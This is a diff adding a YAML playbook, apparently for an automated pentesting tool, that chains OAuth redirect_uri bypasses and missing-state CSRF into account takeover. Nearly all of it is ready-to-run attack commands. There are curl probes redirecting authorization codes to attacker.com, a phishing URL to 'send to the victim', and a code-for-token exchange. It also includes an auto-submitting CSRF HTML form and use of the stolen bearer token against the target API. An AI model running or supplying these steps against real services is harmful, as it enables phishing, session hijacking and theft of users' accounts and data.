@@ -1,0 +1,112 @@
+id: oauth-redirect-uri-abuse
+name: "Web — OAuth redirect_uri / state abuse → account takeover"
+description: >
+  OAuth 2.0 implementations commonly mis-validate `redirect_uri` (open
+  redirect, subdomain wildcard, path-traversal) — attacker captures the
+  authorization code / access token meant for the victim's account.
+  Bonus: missing or static `state` enables full CSRF on the OAuth flow.
+tags: [web, oauth, sso, redirect-uri, account-takeover]
+difficulty: medium
+
+inputs:
+  - name: oauth_authorize_url
+    description: "Authorization endpoint (e.g. https://auth.target.com/oauth/authorize)."
+    required: true
+  - name: client_id
+    description: "Public client_id of the legitimate app."
+    required: true
+  - name: legitimate_redirect_uri
+    description: "The redirect_uri the app normally uses."
+    required: true
+
+steps:
+  - id: enumerate_validations
+    name: "Probe redirect_uri validation rules"
+    inline_command: |
+      # Try each variant and check whether the IDP issues a code:
+      # 1) Open redirect on the registered domain:
+      curl -I "<auth>?response_type=code&client_id=<cid>&redirect_uri=<legit>/../attacker.com&state=x"
+      # 2) Subdomain bypass (if *.target.com is registered):
+      curl -I "<auth>?response_type=code&client_id=<cid>&redirect_uri=https://attacker.target.com&state=x"
+      # 3) Path traversal:
+      curl -I "<auth>?response_type=code&client_id=<cid>&redirect_uri=<legit>/../../redirect?to=attacker.com&state=x"
+      # 4) URL encoded host:
+      curl -I "<auth>?response_type=code&client_id=<cid>&redirect_uri=https%3A%2F%2Fattacker.com&state=x"
+      # 5) @ trick:
+      curl -I "<auth>?response_type=code&client_id=<cid>&redirect_uri=https://<legit-host>@attacker.com&state=x"
+    inputs:
+      auth: "${oauth_authorize_url}"
+      cid: "${client_id}"
+      legit: "${legitimate_redirect_uri}"
+    notes: |
+      Any 302 to attacker.com (or any path containing the auth code)
+      indicates a working bypass. Save the exact payload that worked.
+
+  - id: craft_full_phish
+    name: "Craft the phishing URL that captures the code"
+    inline_command: |
+      # Once you have a working redirect_uri bypass:
+      echo 'Send this URL to the victim:'
+      echo '<auth>?response_type=code&client_id=<cid>&redirect_uri=https://attacker.com/callback&state=x&scope=openid+profile+email'
+      # On click → IDP grants code → redirects to attacker.com/callback?code=AUTHORIZATION_CODE
+    inputs:
+      auth: "${oauth_authorize_url}"
+      cid: "${client_id}"
+
+  - id: exchange_code
+    name: "Exchange captured code for an access token"
+    inline_command: |
+      curl -X POST '<token_endpoint>' \
+        -d 'grant_type=authorization_code' \
+        -d 'code=<CAPTURED_CODE>' \
+        -d 'client_id=<cid>' \
+        -d 'redirect_uri=https://attacker.com/callback'
+    inputs:
+      cid: "${client_id}"
+    notes: |
+      Public clients (PKCE) won't need a client_secret. Confidential clients
+      do — but you might not need to exchange at all; many apps use the
+      code itself as a session token in their callback path.
+    capture:
+      - var: oauth_access_token
+        regex: '"access_token"\s*:\s*"([^"]+)"'
+        match: first
+
+  - id: state_csrf
+    name: "If state is empty/static — CSRF the entire flow"
+    inline_command: |
+      # Build an HTML auto-submit form pointing at /oauth/callback?code=<your_code>:
+      cat > csrf-oauth.html <<'EOF'
+      <html><body onload="document.forms[0].submit()">
+      <form action="https://victim-app.com/oauth/callback" method="GET">
+        <input name="code" value="ATTACKER_CODE">
+        <input name="state" value="">
+      </form>
+      </body></html>
+      EOF
+      # Lure victim → their session ends up bound to YOUR account.
+    notes: |
+      Same primitive used in account-merge attacks: log in as victim into
+      attacker's account → linked → attacker now owns victim's data.
+
+  - id: use_token
+    name: "Use the access token against the API"
+    inline_command: |
+      curl 'https://api.target.com/me' \
+        -H 'Authorization: Bearer <token>'
+    inputs:
+      token: "${oauth_access_token}"
+
+references:
+  - title: "PortSwigger — OAuth"
+    url:   "https://portswigger.net/web-security/oauth"
+  - title: "HackTricks — OAuth"
+    url:   "https://book.hacktricks.wiki/en/pentesting-web/oauth-to-account-takeover.html"
+
+next_chains:
+  - chain: jwt-attacks
+    when:   'token is a JWT'
+    reason: 'Inspect/forge the JWT once captured.'
+  - chain: csrf-and-token-leak
+    when:   'state CSRF surfaces login flow weaknesses'
+    reason: 'Chain with broader CSRF for fuller takeover.'
